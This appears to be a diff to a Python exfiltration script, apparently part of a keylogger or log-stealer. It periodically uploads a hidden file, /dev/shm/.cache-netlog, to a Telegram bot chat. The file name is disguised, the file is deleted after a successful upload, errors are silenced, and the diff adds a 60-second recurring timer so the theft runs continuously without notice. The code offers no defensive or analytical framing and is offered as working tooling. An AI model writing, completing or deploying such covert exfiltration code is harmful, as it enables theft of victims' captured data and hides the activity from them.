@@ -1,28 +1,32 @@
 import requests
 import time
+import threading
+import os
 
-BOT_TOKEN = "" #BOT TOKEN
-CHAT_ID = "" #CHAT ID
+BOT_TOKEN = "" #ENTER BOT TOKEN HERE
+CHAT_ID = "" #ENTER CHAT/CHANNEL ID HERE
 MESSAGE_FILE = "/dev/shm/.cache-netlog"
 MAX_RETRIES = 5
+INTERVAL = 60 #TIME INTERVAL AFTER WHICH FILE WILL BE SENT IN SECONDS
 
-for attempt in range(MAX_RETRIES):
-    try:
-        with open(MESSAGE_FILE, 'rb') as f:
-            response = requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                data={"chat_id": CHAT_ID},
-                files={"document": f}
-            )
+def send_logs():
+    for attempt in range(MAX_RETRIES):
+        try:
+            if os.path.exists(MESSAGE_FILE):
+                with open(MESSAGE_FILE, 'rb') as f:
+                    response = requests.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+                        data={"chat_id": CHAT_ID},
+                        files={"document": f}
+                    )
+                if response.status_code == 200:
+                    os.remove(MESSAGE_FILE)
+                    break
+        except requests.ConnectionError:
+            time.sleep(2)
+        except Exception:
+            pass
 
-        if response.status_code == 200:
-            break  #Successfully sent
+    threading.Timer(INTERVAL, send_logs).start()
 
-    except requests.ConnectionError:
-        time.sleep(2)
-
-try:
-    import os
-    os.remove(MESSAGE_FILE)
-except Exception:
-    pass
+send_logs()
